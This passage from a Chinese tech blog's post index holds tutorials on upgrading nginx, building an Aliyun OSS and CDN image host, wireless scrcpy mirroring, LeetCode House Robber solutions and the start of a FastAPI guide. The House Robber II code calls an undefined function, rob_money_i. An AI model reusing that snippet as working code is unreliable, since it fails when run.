<p>准备已编译好的新版目录(安装步骤执行到<code>make install</code>之前)<br>执行<code>make install</code>的话会<strong>覆盖</strong>掉原本的配置文件</p>
<p><img data-src="http://img.owq.world/2021/11/1733-352115.png"></p>
<p>下面操作会将<code>nginx-1.20.1</code>升级到<code>nginx-1.20.2</code></p>
<ol>
<li><p>备份旧版nginx可执行文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /usr/local/nginx</span><br><span class="line"><span class="built_in">cp</span> nginx nginx.old</span><br></pre></td></tr></table></figure>
</li>
<li><p>将新版本编译目录下的objs中的nginx替换掉nginx</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cp</span> ~/nginx/core/nginx-1.20.2/objs/nginx /usr/local/nginx</span><br><span class="line"></span><br><span class="line"><span class="comment"># 文件被占用使用命令强制覆盖</span></span><br><span class="line"><span class="built_in">cp</span> -rfp ~/nginx/core/nginx-1.20.2/objs/nginx /usr/local/nginx</span><br></pre></td></tr></table></figure>
</li>
<li><p>测试新版本是否正常</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nginx -t</span><br></pre></td></tr></table></figure>
</li>
<li><p>执行<code>make upgrade</code></p>
<p><img data-src="http://img.owq.world/2021/11/1750-91c660.png"></p>
</li>
</ol>
<p>命令没有报错就成功了~</p>
]]></content>
      <categories>
        <category>学习教程</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>阿里云OSS 图床搭建</title>
    <url>/bee760ec/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
<p>事情起因是smms的链接在网站备案后不知为何加载不了，而且还存在图片数据丢失情况，考虑到加载速度和稳定性，便决定使用阿里云OSS，用它来搭建个人图床。</p>
</blockquote>
<h3 id="说说优点"><a href="#说说优点" class="headerlink" title="说说优点"></a>说说优点</h3><ul>
<li>图床配置简单</li>
<li>数据不会丢失</li>
<li>国内访问速度快</li>
<li>阿里云服务支持</li>
</ul>
<h3 id="前置条件"><a href="#前置条件" class="headerlink" title="前置条件"></a>前置条件</h3><ul>
<li>通过IPC备案好的域名</li>
<li>使用过PicGo上传过图片</li>
</ul>
<h3 id="请求流程"><a href="#请求流程" class="headerlink" title="请求流程"></a>请求流程</h3><blockquote>
<p>完成配置好, 访问图片时将会是这样的一个流程</p>
</blockquote>
<ul>
<li>子域名(外网跳转) -&gt; CDN(内网访问) -&gt; OSS(资源文件)</li>
</ul>
<h2 id="创建OSS"><a href="#创建OSS" class="headerlink" title="创建OSS"></a>创建OSS</h2><p>打开阿里云 <span class="exturl" data-url="aHR0cHM6Ly9vc3MuY29uc29sZS5hbGl5dW4uY29tL292ZXJ2aWV3">对象存储OSS</span><br>链接失效的话, 手动点击右上角菜单找到<code>对象存储OSS</code>打开</p>
<p><em><img data-src="http://img.owq.world/2021/11/2044-022e40.png" style="zoom: 50%;" /></em></p>
<p>找到<code>Bucket列表</code>点击<code>创建Bucket</code></p>
<img data-src="http://img.owq.world/2021/11/1541-68155b.png" style="zoom:50%;" />

<p>这里注意几个点就行了，名称和地域自行选择，<strong>存储类型</strong>选择<strong>标准存储</strong>，<strong>读写权限</strong>选择<strong>私有</strong>（<em>之后通过CDN加速访问，不走公网流量</em>），其它服务一般用不到，所以选择不开通，然后点击确认。</p>
<img data-src="http://img.owq.world/2021/11/1543-217218.png" style="zoom:67%;" />

<p>然后看看你的 Bucket列表 是不是多了一个Bucket</p>
<p><img data-src="http://img.owq.world/2021/11/2055-4aa5bc.png"></p>
<h2 id="资源包购买"><a href="#资源包购买" class="headerlink" title="资源包购买"></a>资源包购买</h2><blockquote>
<p>如果你储存的数据只有几G, 甚至不到1G的话，是没有购买的必要的, 因为使用按量计算价格反而会比购买资源包便宜。</p>
<p>具体可以参考阿里云产品价格 -&gt; <span class="exturl" data-url="aHR0cHM6Ly93d3cuYWxpeXVuLmNvbS9wcmljZS9wcm9kdWN0">🚪</span></p>
</blockquote>
<p><img data-src="http://img.owq.world/2021/11/2125-8bdcd6.png"></p>
<p>按图示进入购买资源包页面</p>
<img data-src="http://img.owq.world/2021/11/2058-d7c8f7.png" style="zoom:50%;" />

<p>然后选择对应储存下单购买即可</p>
<p><img data-src="http://img.owq.world/2021/11/2123-4c2bfd.png"></p>
<h2 id="配置域名绑定"><a href="#配置域名绑定" class="headerlink" title="配置域名绑定"></a>配置域名绑定</h2><blockquote>
<p>只有绑定好域名后才能配置CDN加速.</p>
</blockquote>
<p>打开刚刚创建的<code>Bucket</code></p>
<img data-src="http://img.owq.world/2021/11/2151-6ad1d9.png" style="zoom:50%;" />

<p>进入传输管理, 点击绑定域名</p>
<img data-src="http://img.owq.world/2021/11/2204-213d3a.png" style="zoom:50%;" />



<p>输入要绑定的子域名, 勾上自动添加解析然后提交</p>
<img data-src="http://img.owq.world/2021/11/2210-888938.png" style="zoom: 50%;" />



<p>这时候访问域名会跳转到oss处, 但是因为<code>Bucket</code>设置的是私有, 所以外网是没法访问里面的文件, 但是通过CDN却可以, 所以接下来配置CDN<br><img data-src="http://img.owq.world/2021/11/2214-250364.png" style="zoom: 67%;" /></p>
<h2 id="配置CDN加速"><a href="#配置CDN加速" class="headerlink" title="配置CDN加速"></a>配置CDN加速</h2><blockquote>
<p>CDN可以让你图片加载更快, 我们还可以通过阿里云的CDN控制台配置第一道防护墙, 防止服务器被攻击, 跑太多流量而造成金钱损失.</p>
</blockquote>
<p>进入CDN配置</p>
<p><img data-src="http://img.owq.world/2021/11/2227-615f8f.png"></p>
<p><img data-src="http://img.owq.world/2021/11/2230-02d11e.png"></p>
<p>点击新增源站信息,选择刚才创建的oss</p>
<img data-src="http://img.owq.world/2021/11/2231-eac809.png" style="zoom: 80%;" />

<p>  进入下一步</p>
<p><img data-src="http://img.owq.world/2021/11/2232-255f3f.png"></p>
<p>接下来就是一大堆可选配置了，这里稍微配置下安全性，其它的请自行阅读说明进行配置<del>绝对不是因为说明太详细我懒的写</del></p>
<p><img data-src="http://img.owq.world/2021/11/2237-4ccd07.png"></p>
<p>修改配置设置带宽封顶，可以避免被恶意攻击或刷流量而产生高额的CDN账单。</p>
<img data-src="http://img.owq.world/2021/11/2240-55d797.png" style="zoom: 50%;" />

<p>配置好后按进入下一步按系统提示配置CNAME，之后这些都可以修改，所以可以先走一遍流程然后回头再详细配置下。</p>
<h2 id="CDN配置"><a href="#CDN配置" class="headerlink" title="CDN配置"></a>CDN配置</h2><p>回到Bucket管理配置下缓存自动刷新，将其开启.</p>
<p><img data-src="http://img.owq.world/2021/11/1229-76fcbb.png"></p>
<p>全部勾上就行了<br><img data-src="http://img.owq.world/2021/11/1230-af5e88.png" style="zoom: 80%;" /></p>
<p>弄好后打开<code>CDN控制台</code><br><img data-src="http://img.owq.world/2021/11/2246-aba139.png" alt="" style="zoom: 67%;" /></p>
<p>打开配置</p>
<p><img data-src="http://img.owq.world/2021/11/1243-0192a4.png"></p>
<p>配置回源设置，让通过CDN的链接可以访问到OSS里面内容，顺便指定下回源协议为http</p>
<p><img data-src="http://img.owq.world/2021/11/1246-6948f3.png"></p>
<p>其它配置可以等流程走完再去弄</p>
<h2 id="创建管理用户"><a href="#创建管理用户" class="headerlink" title="创建管理用户"></a>创建管理用户</h2><blockquote>
<p>专门用来访问oss存储的账户</p>
</blockquote>
<p>点击右上角的个人头像，打开访问控制</p>
<img data-src="http://img.owq.world/2021/11/2128-5d7085.png" style="zoom: 67%;" />

<p>创建用户</p>
<img data-src="http://img.owq.world/2021/11/2135-cdb631.png" style="zoom:50%;" />

<p>输入登录和显示名称,勾上 <code>Open API 调用访问</code>, 然后点击确认</p>
<img data-src="http://img.owq.world/2021/11/2136-25099d.png" style="zoom:50%;" />

<p>创建成功后记得保存好<code>AccessKey</code>信息</p>
<p><img data-src="http://img.owq.world/2021/11/2139-e4162c.png"></p>
<p>接下来为刚刚创建的用户添加权限</p>
<p><img data-src="http://img.owq.world/2021/11/2142-4c4b7f.png"></p>
<p>添加 <code>AliyunOSSFullAccess</code> 用来管理OSS, 确认完毕后管理用户就配置好了</p>
<img data-src="http://img.owq.world/2021/11/2143-3fcdd0.png" style="zoom:50%;" />

<h2 id="PicGO配置"><a href="#PicGO配置" class="headerlink" title="PicGO配置"></a>PicGO配置</h2><p>将刚刚生成的<code>AccessKey</code>信息填进去，然后填写你的<code>Bucket</code>名和存储区域还有域名，其它可以自定义。</p>
<img data-src="http://img.owq.world/2021/11/1214-2b0efd.png" style="zoom:50%;" />

<p>随便上传一张图像，然后访问图像地址正常显示就成功了，如有意外请参照阿里云帮助文档<del>笑</del>。</p>
<h2 id="OSS管理器"><a href="#OSS管理器" class="headerlink" title="OSS管理器"></a>OSS管理器</h2><blockquote>
<p>用oss搭建图床只是一个小小的功能，就比如你还可以把它当作一个人云盘存放资料用。</p>
</blockquote>
<p>这里推荐阿里云的可视化管理器，可以非常方便的操作里面的文件，已经进行一些配置。</p>
<p>github -&gt; <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FsaXl1bi9vc3MtYnJvd3Nlcg==">https://github.com/aliyun/oss-browser</span><br>gitee -&gt; <span class="exturl" data-url="aHR0cHM6Ly9naXRlZS5jb20vbWlycm9ycy9vc3MtYnJvd3Nlcg==">https://gitee.com/mirrors/oss-browser</span></p>
]]></content>
      <categories>
        <category>学习教程</category>
      </categories>
      <tags>
        <tag>oss</tag>
        <tag>cdn</tag>
      </tags>
  </entry>
  <entry>
    <title>scrcpy 优雅的安卓投屏工具</title>
    <url>/72a0046c/</url>
    <content><![CDATA[<style type="text/css">.post img {border-radius: 0;}</style>

<blockquote>
<p>项目地址 -&gt; <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0dlbnltb2JpbGUvc2NyY3B5">🚪</span><br>官方文档 -&gt; <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0dlbnltb2JpbGUvc2NyY3B5L2Jsb2IvbWFzdGVyL1JFQURNRS56aC1IYW5zLm1k">🚪</span></p>
</blockquote>
<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><ul>
<li><p>下载包<br>版本页面 -&gt; <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0dlbnltb2JpbGUvc2NyY3B5L3RhZ3M=">https://github.com/Genymobile/scrcpy/tags</span></p>
</li>
<li><p>解压(位置随意)</p>
<p>这里解压到<code>C:\Tools\scrcpy</code><br>因为包自带<code>adb</code>工具, 这里可以不用额外配置<code>adb</code>, 已配置好的可以忽略</p>
<img data-src="http://img.owq.world/2021/11/2124-7e8658.png" style="zoom:50%;" />
</li>
<li><p>设置环境变量</p>
<p>系统属性 - 环境变量 - 新增Path变量 -添加解压目录<br><img data-src="http://img.owq.world/2021/11/2127-fb6625.png"></p>
</li>
<li><p>验证测试</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># adb 版本</span></span><br><span class="line">adb version</span><br><span class="line"></span><br><span class="line"><span class="comment"># scrcpy 版本</span></span><br><span class="line">scrcpy <span class="literal">-v</span></span><br></pre></td></tr></table></figure>

<img data-src="http://img.owq.world/2021/11/2124-6ca332.png" alt="" style="zoom:67%;" />

<p>成功输出版本信息则配置完成~</p>
</li>
</ul>
<h2 id="开始使用"><a href="#开始使用" class="headerlink" title="开始使用"></a>开始使用</h2><h3 id="初始配置"><a href="#初始配置" class="headerlink" title="初始配置"></a>初始配置</h3><ul>
<li><p>第一次使用, 先进行以下配置, 然后用<strong>数据线</strong>连接PC</p>
<ul>
<li>进入开发者选项 打开<strong>USB调试</strong></li>
<li>进入WiFi设置 配置<strong>静态IP</strong></li>
</ul>
</li>
<li><p>终端输入<code>scrcpy</code>直接进行有线连接控制(可选)</p>
</li>
<li><p>开放手机<code>TCP</code>服务端口, 用来进行无线连接(关键)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adb tcpip 5555 <span class="comment"># 这里设置端口为5555</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>多台设备连接<br>  如果<code>adb</code>已经连接多台设备的话, 运行以上命令会报<code>error: more than one device/emulator</code>错误, 这时你需要指定下<code>device</code></p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看连接的设备</span></span><br><span class="line">adb devices</span><br><span class="line"></span><br><span class="line"><span class="comment"># -s 指定devices开放端口</span></span><br><span class="line">adb -s [devices] tcpip 5555</span><br></pre></td></tr></table></figure>

<p>  <strong>Tips:</strong> 只连接一个设备时可以不用指定<code>device</code></p>
</li>
</ul>
<p><em>PS: 手机重启后设置会丢失, 需要重新连接电脑配置</em> 到这里就可以断开数据线了😏</p>
<h3 id="无线连接"><a href="#无线连接" class="headerlink" title="无线连接"></a>无线连接</h3><p>使用你设置好的静态IP连接</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># scrcpy -s [ip]:[port]</span></span><br><span class="line">scrcpy -s 192.168.0.90:5555</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加上 --turn-screen-off 设置设备黑屏</span></span><br><span class="line"><span class="comment"># 启动后使用快捷键 Alt + o 更加方便哦</span></span><br><span class="line">scrcpy --turn-screen-off</span><br></pre></td></tr></table></figure>

<p>接下来开始愉快的投屏之旅吧🥳</p>
<h2 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h2><table>
<thead>
<tr>
<th align="left">操作</th>
<th align="left">快捷键</th>
</tr>
</thead>
<tbody><tr>
<td align="left">全屏</td>
<td align="left">Alt + f</td>
</tr>
<tr>
<td align="left">向左旋转屏幕</td>
<td align="left">Alt + ← (左箭头)</td>
</tr>
<tr>
<td align="left">向右旋转屏幕</td>
<td align="left">Alt + → <em>(<em>右箭头</em>)</em></td>
</tr>
<tr>
<td align="left">将窗口大小重置为1:1 (匹配像素)</td>
<td align="left">Alt + g</td>
</tr>
<tr>
<td align="left">将窗口大小重置为消除黑边</td>
<td align="left">Alt + w | 双击</td>
</tr>
<tr>
<td align="left">点按 <code>主屏幕</code></td>
<td align="left">Alt + h | 鼠标中键</td>
</tr>
<tr>
<td align="left">点按 <code>返回</code></td>
<td align="left">Alt + b | 鼠标右键</td>
</tr>
<tr>
<td align="left">点按 <code>切换应用</code></td>
<td align="left">Alt + s</td>
</tr>
<tr>
<td align="left">点按 <code>菜单</code> (解锁屏幕)</td>
<td align="left">Alt + m</td>
</tr>
<tr>
<td align="left">点按 <code>音量 + </code></td>
<td align="left">Alt + ↑ (上箭头)</td>
</tr>
<tr>
<td align="left">点按 <code>音量-</code></td>
<td align="left">Alt + ↓ (下箭头)</td>
</tr>
<tr>
<td align="left">点按 <code>电源</code></td>
<td align="left">Alt + p</td>
</tr>
<tr>
<td align="left">打开屏幕</td>
<td align="left">鼠标右键</td>
</tr>
<tr>
<td align="left">关闭设备屏幕 (但继续在电脑上显示)</td>
<td align="left">Alt + o</td>
</tr>
<tr>
<td align="left">打开设备屏幕</td>
<td align="left">Alt + Shift + o</td>
</tr>
<tr>
<td align="left">旋转设备屏幕</td>
<td align="left">Alt + r</td>
</tr>
<tr>
<td align="left">展开通知面板</td>
<td align="left">Alt + n</td>
</tr>
<tr>
<td align="left">收起通知面板</td>
<td align="left">Alt + Shift + n</td>
</tr>
<tr>
<td align="left">复制到剪贴板</td>
<td align="left">Alt + c</td>
</tr>
<tr>
<td align="left">剪切到剪贴板</td>
<td align="left">Alt + x</td>
</tr>
<tr>
<td align="left">同步剪贴板并粘贴</td>
<td align="left">Alt + v</td>
</tr>
<tr>
<td align="left">注入电脑剪贴板文本</td>
<td align="left">Alt + Shift + v</td>
</tr>
<tr>
<td align="left">打开&#x2F;关闭FPS显示 (在 stdout)</td>
<td align="left">Alt + i</td>
</tr>
<tr>
<td align="left">捏拉缩放</td>
<td align="left">Ctrl + 按住并移动鼠标</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>好软工具</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>adb</tag>
      </tags>
  </entry>
  <entry>
    <title>动态规划 打家劫舍</title>
    <url>/bd9e5b39/</url>
    <content><![CDATA[<h2 id="Question-Ⅰ🔎"><a href="#Question-Ⅰ🔎" class="headerlink" title="Question Ⅰ🔎"></a>Question Ⅰ🔎</h2><blockquote>
<p>你是一个专业的小偷，计划偷窃沿街的房屋。每间房内都藏有一定的现金，<br>影响你偷窃的唯一制约因素就是相邻的房屋装有相互连通的防盗系统，<strong>如果两间相邻的房屋在同一晚上被小偷闯入，系统会自动报警</strong>。<br>给定一个代表每个房屋存放金额的非负整数数组，计算你 <strong>不触动警报装置的情况下</strong> ，一夜之内能够偷窃到的最高金额。</p>
</blockquote>
<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">输入：[1,2,3,1]</span><br><span class="line">输出：4</span><br><span class="line">解释：偷窃 1 号房屋 (金额 = 1) ，然后偷窃 3 号房屋 (金额 = 3)。</span><br><span class="line">     偷窃到的最高金额 = 1 + 3 = 4 。</span><br><span class="line">     </span><br><span class="line">输入：[2,7,9,3,1]</span><br><span class="line">输出：12</span><br><span class="line">解释：偷窃 1 号房屋 (金额 = 2), 偷窃 3 号房屋 (金额 = 9)，接着偷窃 5 号房屋 (金额 = 1)。</span><br><span class="line">     偷窃到的最高金额 = 2 + 9 + 1 = 12 。</span><br></pre></td></tr></table></figure>



<h2 id="Code-Ⅰ💡"><a href="#Code-Ⅰ💡" class="headerlink" title="Code Ⅰ💡"></a>Code Ⅰ💡</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">house_rob_i</span>(<span class="params">nums: <span class="built_in">list</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 当无房间时, 直接返回0</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> nums:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 只有一个房间时, 那就只能偷它的了</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(nums) == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> nums[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 设置一个列表, 下标 i 对应着前 i 个房间可以偷取的最大金额</span></span><br><span class="line">    max_money = [<span class="number">0</span>, nums[<span class="number">0</span>]]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 从第2个房间开始计算, 传入第1个房间后的列表</span></span><br><span class="line">    <span class="comment"># 这里需要注意的是, 取 max_money 对应值时, i 要进行加一</span></span><br><span class="line">    <span class="keyword">for</span> i, v <span class="keyword">in</span> <span class="built_in">enumerate</span>(nums[<span class="number">1</span>:]):</span><br><span class="line">        <span class="comment"># max_money[i+1] 表示不偷取当前房间的累计金额</span></span><br><span class="line">        <span class="comment"># max_money[i] + v 表示偷取当前房间的累计金额</span></span><br><span class="line">        <span class="comment"># 对比2种情况, 取最大值追加到 max_money 中</span></span><br><span class="line">        max_money.append(<span class="built_in">max</span>(max_money[i+<span class="number">1</span>], max_money[i] + v))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 返回最后一个值</span></span><br><span class="line">    <span class="keyword">return</span> max_money[-<span class="number">1</span>]</span><br></pre></td></tr></table></figure>

<blockquote>
<p>原题地址 -&gt; <span class="exturl" data-url="aHR0cHM6Ly9sZWV0Y29kZS1jbi5jb20vcHJvYmxlbXMvaG91c2Utcm9iYmVyLw==">https://leetcode-cn.com/problems/house-robber/</span></p>
</blockquote>
<h2 id="Test-Ⅰ💠"><a href="#Test-Ⅰ💠" class="headerlink" title="Test Ⅰ💠"></a>Test Ⅰ💠</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;house_rob_i&#x27;</span>)</span><br><span class="line">nums = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(house_rob_i(nums))</span><br><span class="line">nums = [<span class="number">2</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(house_rob_i(nums))</span><br></pre></td></tr></table></figure>



<hr>
<h2 id="Question-Ⅱ🔎"><a href="#Question-Ⅱ🔎" class="headerlink" title="Question Ⅱ🔎"></a>Question Ⅱ🔎</h2><blockquote>
<p>你是一个专业的小偷，计划偷窃沿街的房屋，每间房内都藏有一定的现金。<br>这个地方所有的房屋都 <strong>围成一圈</strong> ，这意味着第一个房屋和最后一个房屋是紧挨着的。<br>同时，相邻的房屋装有相互连通的防盗系统，如果两间相邻的房屋在同一晚上被小偷闯入，系统会自动报警 。<br>给定一个代表每个房屋存放金额的非负整数数组，计算你 在不触动警报装置的情况下 ，今晚能够偷窃到的最高金额。</p>
</blockquote>
<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">输入：nums = [2,3,2]</span><br><span class="line">输出：3</span><br><span class="line">解释：你不能先偷窃 1 号房屋（金额 = 2），然后偷窃 3 号房屋（金额 = 2）, 因为他们是相邻的。</span><br><span class="line"></span><br><span class="line">输入：nums = [1,2,3,1]</span><br><span class="line">输出：4</span><br><span class="line">解释：你可以先偷窃 1 号房屋（金额 = 1），然后偷窃 3 号房屋（金额 = 3）。</span><br><span class="line">     偷窃到的最高金额 = 1 + 3 = 4 。</span><br></pre></td></tr></table></figure>

<h2 id="Code-Ⅱ💡"><a href="#Code-Ⅱ💡" class="headerlink" title="Code Ⅱ💡"></a>Code Ⅱ💡</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">house_rob_ii</span>(<span class="params">nums: <span class="built_in">list</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="comment"># 这里只需要在第一题的基础上考虑两种情况</span></span><br><span class="line">    <span class="comment"># 第一种: 包含首元素, 不包含尾元素</span></span><br><span class="line">    <span class="comment"># 第二种: 不包含首元素, 包含尾元素</span></span><br><span class="line">    <span class="comment"># 综上, 一行代码搞定~</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">max</span>(rob_money_i(nums[<span class="number">1</span>:]), rob_money_i(nums[:-<span class="number">1</span>]))</span><br></pre></td></tr></table></figure>

<blockquote>
<p>原题地址 -&gt; <span class="exturl" data-url="aHR0cHM6Ly9sZWV0Y29kZS1jbi5jb20vcHJvYmxlbXMvaG91c2Utcm9iYmVyLWlpLw==">https://leetcode-cn.com/problems/house-robber-ii/</span></p>
</blockquote>
<h2 id="Test-Ⅱ💠"><a href="#Test-Ⅱ💠" class="headerlink" title="Test Ⅱ💠"></a>Test Ⅱ💠</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;house_rob_ii&#x27;</span>)</span><br><span class="line">nums = [<span class="number">2</span>,<span class="number">3</span>,<span class="number">2</span>]</span><br><span class="line"><span class="built_in">print</span>(house_rob_ii(nums))</span><br><span class="line">nums = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(house_rob_ii(nums))</span><br></pre></td></tr></table></figure>



<hr>
<h2 id="Question-Ⅲ🔎"><a href="#Question-Ⅲ🔎" class="headerlink" title="Question Ⅲ🔎"></a>Question Ⅲ🔎</h2><blockquote>
<p>在上次打劫完一条街道之后和一圈房屋后，小偷又发现了一个新的可行窃的地区。<br>这个地区只有一个入口，我们称之为“根”。 除了“根”之外，每栋房子有且只有一个“父“房子与之相连。<br>一番侦察之后，聪明的小偷意识到“这个地方的所有房屋的排列类似于<strong>一棵二叉树</strong>”。<br>如果两个直接相连的房子在同一天晚上被打劫，房屋将自动报警。计算在不触动警报的情况下，小偷一晚能够盗取的最高金额。</p>
</blockquote>
<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">输入: [3,2,3,null,3,null,1]      3</span><br><span class="line">                                / <span class="keyword">\</span></span><br><span class="line"><span class="keyword"></span>                               2   3</span><br><span class="line">                                <span class="keyword">\ </span>  <span class="keyword">\ </span></span><br><span class="line">                                 3   1</span><br><span class="line">输出: 7 </span><br><span class="line">解释: 小偷一晚能够盗取的最高金额 = 3 + 3 + 1 = 7.</span><br><span class="line"></span><br><span class="line">输入: [3,4,5,1,3,null,1]     3</span><br><span class="line">                            / <span class="keyword">\</span></span><br><span class="line"><span class="keyword"></span>                           4   5</span><br><span class="line">                          / <span class="keyword">\ </span>  <span class="keyword">\ </span></span><br><span class="line">                         1   3   1</span><br><span class="line">输出: 9</span><br><span class="line">解释: 小偷一晚能够盗取的最高金额 = 4 + 5 = 9.</span><br></pre></td></tr></table></figure>



<h2 id="Code-Ⅲ💡"><a href="#Code-Ⅲ💡" class="headerlink" title="Code Ⅲ💡"></a>Code Ⅲ💡</h2><blockquote>
<p>进阶版来了, 这里考虑的同样是前一个房子和后一个房子是否相隔, 需要考虑的同样只有两种情况, 解题思路是一样的.<br>但要注意的是, 这是二叉树结构, 这样的话, 每个节点有两种情况, 而每个节点由有两个子节点(我们把空的节点当成0), 既有${2^n}$的可能, 因此采用递归的方式来解决问题会更方便.</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">house_rob_iii</span>(<span class="params">root: <span class="type">Optional</span>[TreeNode]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 设置递归函数, 返回偷取当前层和不偷取当前层的钱</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">dfs</span>(<span class="params">node = root</span>) -&gt; <span class="built_in">tuple</span>:</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 当前节点为空, 当前层和不偷取当前层的钱都为0, 返回(0,0)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> node:</span><br><span class="line">            <span class="keyword">return</span> (<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 递归获取左右子树能偷取的金额</span></span><br><span class="line">        L, R = dfs(node.left), dfs(node.right)</span><br><span class="line">		</span><br><span class="line">        <span class="comment"># node.val+(L[1]+R[1]) 表示偷取当前层和下下层的金额</span></span><br><span class="line">        <span class="comment"># max(L)+max(R) 表示当前层不偷,偷取下一层的金额</span></span><br><span class="line">        <span class="keyword">return</span> (node.val+(L[<span class="number">1</span>]+R[<span class="number">1</span>]), <span class="built_in">max</span>(L)+<span class="built_in">max</span>(R))</span><br><span class="line">	</span><br><span class="line">    <span class="comment"># 返回偷第一个房子金额和不偷第一个房子金额的最大值</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">max</span>(dfs())</span><br></pre></td></tr></table></figure>

<blockquote>
<p>原题地址 -&gt; <span class="exturl" data-url="aHR0cHM6Ly9sZWV0Y29kZS1jbi5jb20vcHJvYmxlbXMvaG91c2Utcm9iYmVyLWlpaS8=">https://leetcode-cn.com/problems/house-robber-iii/</span></p>
</blockquote>
<h2 id="Test-Ⅲ💠"><a href="#Test-Ⅲ💠" class="headerlink" title="Test Ⅲ💠"></a>Test Ⅲ💠</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">TreeNode</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, val=<span class="number">0</span>, left=<span class="literal">None</span>, right=<span class="literal">None</span></span>):</span><br><span class="line">        self.val = val</span><br><span class="line">        self.left = left</span><br><span class="line">        self.right = right</span><br><span class="line">        </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;house_rob_iii&#x27;</span>)</span><br><span class="line">root = TreeNode(<span class="number">3</span>, TreeNode(<span class="number">2</span>,<span class="literal">None</span>,TreeNode(<span class="number">3</span>)), TreeNode(<span class="number">3</span>, <span class="literal">None</span>, TreeNode(<span class="number">1</span>)))</span><br><span class="line"><span class="built_in">print</span>(house_rob_iii(root))</span><br><span class="line">root = TreeNode(<span class="number">3</span>,  TreeNode(<span class="number">4</span>,TreeNode(<span class="number">1</span>),TreeNode(<span class="number">3</span>)), TreeNode(<span class="number">5</span>, <span class="literal">None</span>, TreeNode(<span class="number">1</span>)))</span><br><span class="line"><span class="built_in">print</span>(house_rob_iii(root))</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>结构算法</category>
      </categories>
  </entry>
  <entry>
    <title>FastAPI 从入门到落地</title>
    <url>/1a0a2507/</url>
    <content><![CDATA[<blockquote>
<p>FastAPI 是一个现代、快速（高性能）的 Web 框架.</p>
</blockquote>
<blockquote>
<p>官方文档 -&gt; <span class="exturl" data-url="aHR0cHM6Ly9mYXN0YXBpLnRpYW5nb2xvLmNvbS96aC8=">🚪</span><br>项目源码 -&gt; <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RpYW5nb2xvL2Zhc3RhcGk=">🚪</span><br>Uvicorn -&gt; <span class="exturl" data-url="aHR0cHM6Ly93d3cudXZpY29ybi5vcmcv">🚪</span></p>
</blockquote>
<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install fastapi uvicorn[standard]</span><br></pre></td></tr></table></figure>

<ul>
<li>uvicorn: ASGI(异步)服务器</li>
</ul>
<h2 id="基础例子"><a href="#基础例子" class="headerlink" title="基础例子"></a>基础例子</h2><p>创建<code>main.py</code>文件</p>
